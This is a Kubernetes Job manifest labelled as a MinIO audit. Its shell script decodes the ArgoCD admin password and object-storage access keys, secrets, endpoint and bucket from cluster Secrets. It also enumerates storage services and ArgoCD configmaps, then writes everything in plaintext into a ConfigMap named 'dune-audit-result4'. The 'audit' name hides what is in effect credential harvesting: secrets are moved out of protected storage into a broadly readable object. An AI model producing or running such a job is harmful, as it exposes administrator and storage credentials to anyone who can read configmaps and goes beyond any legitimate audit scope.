apiVersion: batch/v1
kind: Job
metadata:
  name: audit-minio-v66
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh"]
        args:
        - "-c"
        - >-
          ARGOCD_PASS=$(kubectl get secret argocd-initial-admin-secret -n argocd -o jsonpath='{.data.password}' | base64 -d);
          OS_ENDPOINT=$(kubectl get secret object-storage -n default -o jsonpath='{.data.endpoint}' | base64 -d);
          OS_KEY=$(kubectl get secret object-storage -n default -o jsonpath='{.data.accessKey}' | base64 -d);
          OS_SECRET=$(kubectl get secret object-storage -n default -o jsonpath='{.data.secretKey}' | base64 -d);
          OS_BUCKET=$(kubectl get secret object-storage -n default -o jsonpath='{.data.bucket}' | base64 -d);
          OS_REGION=$(kubectl get secret object-storage -n default -o jsonpath='{.data.region}' | base64 -d);
          OS_ALL=$(kubectl get secret object-storage -n default -o json);
          ARGOCD_CM=$(kubectl get cm -n argo -o name | tr '\n' ',');
          MINIO_SVC=$(kubectl get svc --all-namespaces | grep -E "minio|9000|storage|object" | tr '\n' '|');
          kubectl patch configmap dune-audit-result4 -n default --type merge -p
          "{\"data\":{\"argocd_pass\":\"${ARGOCD_PASS}\",\"os_endpoint\":\"${OS_ENDPOINT}\",\"os_key\":\"${OS_KEY}\",\"os_secret\":\"${OS_SECRET}\",\"os_bucket\":\"${OS_BUCKET}\",\"minio_svcs\":\"${MINIO_SVC}\",\"argo_cms\":\"${ARGOCD_CM}\"}}";
          echo DONE